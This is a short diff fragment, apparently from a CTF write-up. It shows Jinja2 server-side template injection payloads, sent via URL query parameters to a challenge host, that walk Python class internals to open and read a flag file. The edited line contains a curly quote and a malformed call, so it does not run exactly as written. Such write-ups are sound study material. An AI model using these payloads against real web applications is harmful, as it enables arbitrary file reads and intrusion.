@@ -306,6 +306,6 @@ http://111.200.241.244:62326/{{''[request.args.a]}}?a=__class__
 /{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read
 
 类似
-{{__class__.__mro__[2].__subclasses__()[40].('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt').read()}}
+{{’’.__class__.__mro__[2].__subclasses__()[40].('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt').read()}}
 ```
 
